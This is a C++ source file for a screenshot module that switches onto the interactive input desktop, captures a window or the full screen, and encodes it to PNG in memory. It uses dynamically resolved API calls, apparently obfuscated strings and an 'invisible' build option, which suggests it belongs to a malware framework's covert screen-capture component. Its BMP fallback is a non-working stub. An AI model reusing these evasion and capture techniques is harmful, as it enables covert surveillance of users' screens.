#include "core\util.h"
#include "core\string.h"
#include "core\debug.h"

namespace Screenshot
{

using namespace Gdiplus;

ULONG_PTR gdiplusToken; //инициализировалась ли GDI+
CLSID pngCLSID;
bool pngCLSIDExists;
int GDIInited; //0 - еще не инициализирована, 1 - инициализирована, -1 - была попытка инициализировать, но произошла ошибка

//ищет CLSID кодеков для png файла
static bool GetEncoderClsid()
{
	UINT num = 0; // number of image encoders
	UINT size = 0; // size of the image encoder array in bytes
	pngCLSIDExists = false;
	ImageCodecInfo* pImageCodecInfo = NULL;

	API(GDIPLUS, GetImageEncodersSize)( &num, &size );
	if( size == 0 )
		return false;

	pImageCodecInfo = (ImageCodecInfo*)( Mem::Alloc(size) );
	if( pImageCodecInfo == nullptr )
		return false;

	API(GDIPLUS, GetImageEncoders)( num, size, pImageCodecInfo );

	for( uint j = 0; j < num; ++j )
	{
		int len = WStr::Len( pImageCodecInfo[j].MimeType );
		if( pImageCodecInfo[j].MimeType[len - 3] == 'p' && pImageCodecInfo[j].MimeType[len - 2] == 'n' && pImageCodecInfo[j].MimeType[len - 1] == 'g' )
		{
			pngCLSIDExists = true;
			Mem::Copy( &pngCLSID, &pImageCodecInfo[j].Clsid, sizeof(CLSID) );
		}    
	}

	Mem::Free(pImageCodecInfo);
	return true;
}


bool Init()
{
	pngCLSIDExists = false;
	gdiplusToken = 0;
	GDIInited = 0;
	return true;
}

void Release()
{
	if( gdiplusToken )
		API(GDIPLUS, GdiplusShutdown)(gdiplusToken);
}

static bool InitGDIPlus()
{
	if( GDIInited == 0 )
	{
		GdiplusStartupInput input;
		Mem::Zero(input);
		input.GdiplusVersion = 1;
		GDIInited = -1;
		typeGdiplusStartup pGdiplusStartup = API(GDIPLUS, GdiplusStartup);
		if( pGdiplusStartup )
			if( pGdiplusStartup( &gdiplusToken, &input,0 ) == Status::Ok )
			{
				GetEncoderClsid();
				GDIInited = 1;
			}
	}
	return GDIInited > 0 ? true : false;
}

HBITMAP MakeBitmap( HWND hwnd )
{
	HBITMAP ret = nullptr;
//CreateDCW(L"DISPLAY", NULL, NULL, NULL);
	HWINSTA hwindowStation = API(USER32, OpenWindowStationA)( _CS_("WinSta0"), FALSE, WINSTA_ALL_ACCESS );
	if( !hwindowStation )
	{
		DbgMsg("Error OpenWindowStationA()");
	}
	HWINSTA horigWindowStation = API(USER32, GetProcessWindowStation)();
	if( !API(USER32, SetProcessWindowStation)( hwindowStation ) )
	{
		DbgMsg("Error SetProcessWindowStation()");
	}
	HDESK hinputDesktop = API(USER32, OpenInputDesktop)( 0, FALSE, MAXIMUM_ALLOWED );
	if( !hinputDesktop )
	{
		DbgMsg( "Error OpenInputDesktop()" );
	}
	HDESK horigDesktop = API(USER32, GetThreadDesktop)( API(KERNEL32, GetCurrentThreadId)() );
	API(USER32, SetThreadDesktop)( hinputDesktop );

	if( hwnd == HWND_DESKTOP )
		hwnd = API(USER32, GetDesktopWindow)();
	HDC dc = API(USER32, GetWindowDC)(hwnd);
	if( dc )
	{
		HDC mydc = API(GDI32, CreateCompatibleDC)(dc);
		if( mydc )
		{
			RECT r;
			if( API(USER32, GetWindowRect)( hwnd, &r ) )
			{
				int w = r.right - r.left + 1;
				int h = r.bottom - r.top + 1;
				HBITMAP bitmap = API(GDI32, CreateCompatibleBitmap)( dc, w, h );
				if( bitmap )
				{
					HBITMAP oldbitmap = (HBITMAP) API(GDI32, SelectObject)( mydc, bitmap );
					if( API(GDI32, BitBlt)( mydc, 0, 0, w, h, dc, 0, 0, SRCCOPY ) )
					{
						API(GDI32, SelectObject)( mydc, oldbitmap );
						ret = bitmap;
					}
				}
			}
			API(GDI32, DeleteDC)(mydc);
		}
		API(USER32, ReleaseDC)( hwnd, dc );
	}
	return ret;
}

bool MakeBmp( HWND hwnd, Mem::Data& data )
{
	HBITMAP bitmap = MakeBitmap(hwnd);
	API(GDI32, DeleteObject)(bitmap);
	return false;
}

bool MakePng( HWND hwnd, Mem::Data& data )
{
	if( !InitGDIPlus() ) return false;
	if( !pngCLSIDExists ) return false;
	bool ret = false;
	HBITMAP bitmap = MakeBitmap(hwnd);
	if( bitmap )
	{
		GpBitmap* gdiImg;
#ifdef WINAPI_INVISIBLE
		if( API(GDIPLUS, GdipCreateBitmapFromHBITMAP)( bitmap, NULL, &gdiImg ) == Status::Ok )
#else
		if( DllExports::API(GDIPLUS, GdipCreateBitmapFromHBITMAP)( bitmap, NULL, &gdiImg ) == Status::Ok )
#endif
		{
			IStream* stream;
			if( API(OLE32, CreateStreamOnHGlobal)( nullptr, TRUE, &stream ) == S_OK )
			{
#ifdef WINAPI_INVISIBLE
				if( API(GDIPLUS, GdipSaveImageToStream)( gdiImg, stream, &pngCLSID, nullptr ) == GpStatus::Ok )
#else
				if( DllExports::API(GDIPLUS, GdipSaveImageToStream)( gdiImg, stream, &pngCLSID, nullptr ) == GpStatus::Ok )
#endif
				{
					STATSTG stat;
					if( stream->Stat( &stat, 0 ) == S_OK )
					{
						data.MakeEnough( stat.cbSize.LowPart );
						LARGE_INTEGER beg;
						beg.QuadPart = 0;
						stream->Seek( beg, STREAM_SEEK_SET, nullptr );
						ULONG readed;
						if( stream->Read( data.Ptr(), stat.cbSize.LowPart, &readed ) == S_OK )
						{
							data.SetLen(readed);
							ret = true;
						}
					}
				}
				stream->Release();
			}
#ifdef WINAPI_INVISIBLE
			API(GDIPLUS, GdipDisposeImage)(gdiImg);
#else
			DllExports::API(GDIPLUS, GdipDisposeImage)(gdiImg);
#endif
		}
		API(GDI32, DeleteObject)(bitmap);
	}
	return ret;
}

int Make( HWND hwnd, Mem::Data& data )
{
	InitGDIPlus();
	if( pngCLSIDExists )
	{
		if( MakePng( hwnd, data ) )
			return 2;
		else
			if( MakeBmp( hwnd, data ) )
				return 1;
	}
	else
		if( MakeBmp( hwnd, data ) )
			return 1;
	return 0;
}

}
